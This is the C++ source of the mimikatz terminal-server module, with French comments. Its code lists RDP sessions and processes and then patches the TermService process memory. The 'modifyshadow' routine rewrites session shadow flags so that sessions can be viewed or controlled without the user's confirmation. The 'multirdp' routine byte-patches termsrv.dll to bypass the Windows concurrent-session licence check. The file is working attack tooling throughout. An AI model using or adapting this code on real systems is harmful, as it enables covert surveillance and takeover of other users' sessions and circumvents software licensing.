/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/
#include "mod_mimikatz_terminalserver.h"

// http://msdn.microsoft.com/library/aa383464.aspx
vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_terminalserver::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(sessions,		L"sessions"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(processes,		L"processes"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(multirdp,		L"multirdp",		L"Patch le bureau à distance pour dépasser 2 connexions simultanées"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(viewshadow,		L"viewshadow",		L"Affiche l\'état de la prise de contrôle des sessions RDP"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(modifyshadow,	L"modifyshadow",	L"Modifie l\'état de la prise de contrôle des sessions RDP (DISABLE, INTERACT, INTERACT_NOASK, VIEW, VIEW_NOASK"));
	return monVector;
}

bool mod_mimikatz_terminalserver::sessions(vector<wstring> * arguments)
{
	vector<mod_ts::KIWI_WTS_SESSION_INFO> mesSessions;

	if(mod_ts::getSessions(&mesSessions, (arguments->size() ? &arguments->front() : NULL)))
	{
		wcout << L"SessId\tEtat\tstrEtat" << endl;
		for(vector<mod_ts::KIWI_WTS_SESSION_INFO>::iterator maSession = mesSessions.begin(); maSession != mesSessions.end(); maSession++)
		{
			wcout <<
				setw(5) << setfill(wchar_t(' ')) << maSession->id << L'\t' <<
				setw(5) << setfill(wchar_t(' ')) << maSession->state << L'\t' <<
				setw(15) << setfill(wchar_t(' ')) << left << stateToType(maSession->state) << right << L'\t' <<
				maSession->sessionName <<
				endl;
		}
	}
	else wcout << L"mod_ts::getSessions : " << mod_system::getWinError() << endl;
	return true;
}


bool mod_mimikatz_terminalserver::processes(vector<wstring> * arguments)
{
	vector<mod_ts::KIWI_WTS_PROCESS_INFO> mesProcess;

	if(mod_ts::getProcesses(&mesProcess, (arguments->size() ? &arguments->front() : NULL)))
	{
		wcout << L"PID\tSessId\tUtilisateur" << endl;
		for(vector<mod_ts::KIWI_WTS_PROCESS_INFO>::iterator monProcess = mesProcess.begin(); monProcess != mesProcess.end(); monProcess++)
		{
			wcout << 
				setw(5) << setfill(wchar_t(' ')) << monProcess->pid << L'\t' <<
				setw(5) << setfill(wchar_t(' ')) << monProcess->sessionId << L'\t' <<
				setw(48) << setfill(wchar_t(' ')) << left << monProcess->userSid << right << L'\t' << 
				monProcess->processName << 
				endl;
		}
	}
	else wcout << L"mod_ts::getSessions : " << mod_system::getWinError() << endl;
	return true;
}

bool mod_mimikatz_terminalserver::viewshadow(vector<wstring> * arguments)
{
	DWORD session = 0;
	PDWORD ptrSession = NULL;

	if(arguments->size() == 1)
	{
		wstringstream resultat(arguments->front());
		resultat >> session;
		ptrSession = &session;
	}

	listAndOrModifySession(ptrSession);
	return true;
}

bool mod_mimikatz_terminalserver::modifyshadow(vector<wstring> * arguments)
{
	DWORD session = 0;
	PDWORD ptrSession = NULL;

	wstring strState;
	DWORD newState = 0;

	if(arguments->size() == 1)
	{
		strState.assign(arguments->front());
	}
	else if(arguments->size() == 2)
	{
		wstringstream resultat(arguments->front());
		resultat >> session;
		ptrSession = &session;

		strState.assign(arguments->back());
	}

	if(!strState.empty())
	{
		bool strError = false;
		if(_wcsicmp(strState.c_str(), L"DISABLE") == 0)	newState = 0;
		else if(_wcsicmp(strState.c_str(), L"INTERACT") == 0) newState = 1;
		else if(_wcsicmp(strState.c_str(), L"INTERACT_NOASK") == 0) newState = 2;
		else if(_wcsicmp(strState.c_str(), L"VIEW") == 0) newState = 3;
		else if(_wcsicmp(strState.c_str(), L"VIEW_NOASK") == 0) newState = 4;
		else strError = true;

		if(!strError)
			listAndOrModifySession(ptrSession, &newState);
		else
			wcout << L"Erreur de parsing de l\'argument : " << strState << endl;
	}

	return true;
}

bool mod_mimikatz_terminalserver::listAndOrModifySession(DWORD * id, DWORD * newState)
{
	bool reussite = false;

	vector<mod_patch::OS> mesOS;
	mesOS.push_back(mod_patch::WINDOWS_2003_____x86);
	mesOS.push_back(mod_patch::WINDOWS_2003_____x64);
	mesOS.push_back(mod_patch::WINDOWS_XP_PRO___x86);
	mesOS.push_back(mod_patch::WINDOWS_XP_PRO___x64);

	if(mod_patch::checkVersion(&mesOS))
	{
#ifdef _M_X64
		BYTE pattern1NT5[]		= {0x48, 0x3B, 0xFE, 0x74, 0x22};
		long offsetToWin		= -4;
#elif defined _M_IX86
		BYTE pattern1NT5[]		= {0x8D, 0x47, 0x20, 0x53, 0x50, 0xFF, 0x15};
		long offsetToWin		= -6;
#endif
		mod_service::KIWI_SERVICE_STATUS_PROCESS monService;
		wstring serviceName = L"TermService";
		wstring moduleName = L"termsrv.dll";

		if(mod_service::getUniqueForName(&monService, &serviceName))
		{
			mod_process::KIWI_MODULEENTRY32 monModule;
			if(mod_process::getUniqueModuleForName(&monModule, &moduleName, &monService.ServiceStatusProcess.dwProcessId))
			{
				PBYTE baseAddr = monModule.modBaseAddr;
				DWORD taille = monModule.modBaseSize;		

				if(HANDLE processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, monService.ServiceStatusProcess.dwProcessId))
				{
					PBYTE addrPattern = NULL;
					if(mod_memory::searchMemory(baseAddr, baseAddr + taille, pattern1NT5, &addrPattern, sizeof(pattern1NT5), true, processHandle))
					{
						PBYTE addrWinstationListHead = NULL;

						bool resInterm = false;

#ifdef _M_X64
						long offSet = 0;
						resInterm = mod_memory::readMemory(addrPattern + offsetToWin, reinterpret_cast<PBYTE>(&offSet), sizeof(long), processHandle);
						addrWinstationListHead = addrPattern + offSet;
#elif defined _M_IX86
						resInterm = mod_memory::readMemory(addrPattern + offsetToWin, reinterpret_cast<PBYTE>(&addrWinstationListHead), sizeof(PBYTE), processHandle);
#endif
						if(resInterm)
						{
							PBYTE addrWinstation = addrWinstationListHead;
							do
							{
								if(mod_memory::readMemory(addrWinstation, reinterpret_cast<PBYTE>(&addrWinstation), sizeof(PBYTE), processHandle) && addrWinstation != addrWinstationListHead)
								{
									KIWI_TS_SESSION * maSession = new KIWI_TS_SESSION();
									if(reussite = mod_memory::readMemory(addrWinstation, reinterpret_cast<PBYTE>(maSession), sizeof(KIWI_TS_SESSION), processHandle))
									{
										if((!id) || (maSession->id == *id))
										{
											wcout << L"@Winstation : " << addrWinstation << endl;

											wcout << L"\t" << maSession->prev << L" <-> " << maSession->next << endl;
											wcout << L"\tid     : " << maSession->id << endl;
											wcout << L"\tname   : " << maSession->name << endl;
											wcout << L"\tsname  : " << maSession->sname << endl;
											wcout << L"\ttype   : " << maSession->type << endl;
											wcout << L"\tshadow : " << maSession->shadow << L" (" << shadowToType(maSession->shadow) << L")" << endl;

											if(newState)
											{
												reussite = mod_memory::writeMemory(addrWinstation + FIELD_OFFSET(KIWI_TS_SESSION, shadow), newState, sizeof(DWORD), processHandle);
												wcout << L"\t      => " << *newState << L" (" <<shadowToType(*newState) << L") : " << (reussite ? L"OK" : L"KO") << endl;
											}
											wcout << endl;
										}
									}
									delete maSession;
								}
							} while(addrWinstation != addrWinstationListHead);
						}
						else wcout << L"mod_memory::readMemory " << mod_system::getWinError() << endl;
					}
					else wcout << L"mod_memory::searchMemory " << mod_system::getWinError() << endl;

					CloseHandle(processHandle);
				}
				else wcout << L"OpenProcess " << mod_system::getWinError() << endl;
			}
			else wcout << L"mod_process::getUniqueModuleForName : " << mod_system::getWinError() << endl;
		}
		else wcout << L"mod_process::getUniqueServiceForName : " << mod_system::getWinError() << endl;
	}
	return reussite;
}

bool mod_mimikatz_terminalserver::multirdp(vector<wstring> * arguments)
{
	/* Windows NT 5 (XP / 2003) x86 et x64
	private: long __thiscall CRAPolicy::UseLicense(class CSession &)
	{   
	.text:760BB437                 cmp     eax, 2					83 f8 02	<= comparaison du nombre de sessions par rapport à 2 (après incrémentation)
	.text:760BB43A                 jg      short @@loc_noLicence	7f xx		<= si supérieur, alors on va vers une erreur
	<=>
	.text:760BB43A                 nop								90
	.text:760BB43B                 nop								90
	} */
	BYTE patternTestLicence5[]		= {0x83, 0xf8, 0x02, 0x7f};	// 83 f8 02 7f
	BYTE patternNoTestLicence5[]	= {0x90, 0x90};
	long offsetCibleTestLicence5	= 3;
#ifdef _M_X64
	/* Windows NT 6.0 (Vista / 2008) x64

	:(

	*/
	BYTE patternTestLicence60[]		= {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75};	// 8b 81 38 06 00 00 39 81 3c 06 00 00 75
	BYTE patternNoTestLicence60[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};
	long offsetCibleTestLicence60	= 0;

	/* Windows NT 6.1 (Seven / 2008r2) x64
	public: virtual long CDefPolicy::Query(int *)
	{
	.text:000007FF75A97ACC                 mov     eax, [rdi+638h]					8b 87 38 06 00 00				<= nombre de sessions
	.text:000007FF75A97AD2                 cmp     [rdi+63Ch], eax					39 87 3c 06 00 00				<= comparaison par rapport au maximum
	.text:000007FF75A97AD8                 jz      @@loc_noLicence					0f 84 xx xx xx xx				<= si égal, on va vers un erreur
	<=>
	.text:000007FF75A97ACC                 mov     dword ptr [rdi+63Ch], 7FFFFFFFh	c7 87 3c 06 00 00 ff ff ff 7f	<= on remplace le nombre maximum (2) par 2 147 483 647 (ca devrait aller)
	.text:000007FF75A97AD6                 nop*8									90
	} */
	// mettre un jmp short ?
	BYTE patternTestLicence61[]		= {0x8b, 0x87, 0x38, 0x06, 0x00, 0x00, 0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};	// 8b 87 38 06 00 00 39 87 3c 06 00 00 0f 84
	BYTE patternNoTestLicence61[]	= {0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
	long offsetCibleTestLicence61	= 0;
#elif defined _M_IX86
	/* Windows NT 6.0 (Vista / 2008) x86

	:(

	*/
	BYTE patternTestLicence60[]		= {0x8b, 0x91, 0x24, 0x03, 0x00, 0x00, 0x33, 0xc0, 0x3b, 0x91, 0x20, 0x03, 0x00, 0x00, 0x5e, 0x0f, 0x84};	// 8b 91 24 03 00 00 33 c0 3b 91 20 03 00 00 5e 0f 84
	BYTE patternNoTestLicence60[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x33, 0xc0, 0x5e, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
	long offsetCibleTestLicence60	= 0;

	/* Windows NT 6.1 (Seven) x86
	public: virtual long CDefPolicy::Query(int *)
	{
	.text:6F2F9D4D                 mov     eax, [esi+324h]					8b 86 24 03 00 00				<= nombre de sessions
	.text:6F2F9D53                 cmp     eax, [esi+320h]					3b 86 20 03 00 00				<= comparaison par rapport au maximum
	.text:6F2F9D59                 jz      @@loc_noLicence					0f 84 xx xx xx xx				<= si égal, on va vers un erreur
	<=>
	.text:6F2F9D4D                 mov     dword ptr [esi+320h], 7FFFFFFFh	c7 86 20 03 00 00 ff ff ff 7f	<= on remplace le nombre maximum (2) par 2 147 483 647 (ca devrait aller)
	.text:6F2F9D57                 nop*8									90
	} */
	// mettre un jmp short ?
	BYTE patternTestLicence61[]		= {0x8b, 0x86, 0x24, 0x03, 0x00, 0x00, 0x3b, 0x86, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};	// 8b 86 24 03 00 00 3b 86 20 03 00 00 0f 84
	BYTE patternNoTestLicence61[]	= {0xc7, 0x86, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
	long offsetCibleTestLicence61	= 0;
#endif

	BYTE * patternTestLicence	= NULL;	DWORD szPatternTestLicence	= 0;
	BYTE * patternNoTestLicence	= NULL;	DWORD szPatternNoTestLicence= 0;
	long offsetCibleTestLicence	= 0;

	if(mod_system::GLOB_Version.dwMajorVersion == 5)
	{
		patternTestLicence = patternTestLicence5; szPatternTestLicence = sizeof(patternTestLicence5); 
		patternNoTestLicence = patternNoTestLicence5; szPatternNoTestLicence = sizeof(patternNoTestLicence5);
		offsetCibleTestLicence = offsetCibleTestLicence5;
	}
	else if(mod_system::GLOB_Version.dwMajorVersion == 6)
	{
		if(mod_system::GLOB_Version.dwMinorVersion == 0)
		{
			patternTestLicence = patternTestLicence60; szPatternTestLicence = sizeof(patternTestLicence60);
			patternNoTestLicence = patternNoTestLicence60; szPatternNoTestLicence = sizeof(patternNoTestLicence60);
			offsetCibleTestLicence = offsetCibleTestLicence60;
		}
		else if(mod_system::GLOB_Version.dwMinorVersion == 1)
		{
			patternTestLicence = patternTestLicence61; szPatternTestLicence = sizeof(patternTestLicence61);
			patternNoTestLicence = patternNoTestLicence61; szPatternNoTestLicence = sizeof(patternNoTestLicence61);
			offsetCibleTestLicence = offsetCibleTestLicence61;
		}
	}
		
	if(patternTestLicence && patternNoTestLicence)
	{
		mod_patch::patchModuleOfService(L"TermService", L"termsrv.dll", patternTestLicence, szPatternTestLicence, patternNoTestLicence, szPatternNoTestLicence, offsetCibleTestLicence);
	}
	else wcout << L"Impossible de choisir les patterns \'multirdp\' pour la version " << mod_system::GLOB_Version.dwMajorVersion << L'.' << mod_system::GLOB_Version.dwMinorVersion << endl;
	
	return true;
}



wstring mod_mimikatz_terminalserver::shadowToType(DWORD shadow)
{
	switch(shadow)
	{
	case 0: return(L"DISABLE");
	case 1: return(L"INTERACT (confirmation)");
	case 2: return(L"INTERACT_NOASK");
	case 3: return(L"VIEW (confirmation)");
	case 4: return(L"VIEW_NOASK");
	default: return(L"?");
	}
}

wstring mod_mimikatz_terminalserver::stateToType(DWORD state)
{
	switch(state)
	{
	case WTSActive: return(L"Active");
	case WTSConnected: return(L"Connected");
	case WTSConnectQuery: return(L"ConnectQuery");
	case WTSShadow: return(L"Shadow");
	case WTSDisconnected: return(L"Disconnected");
	case WTSIdle: return(L"Idle");
	case WTSListen: return(L"Listen");
	case WTSReset: return(L"Reset");
	case WTSDown: return(L"Down");
	case WTSInit: return(L"Init");

	default: return(L"?");
	}
}
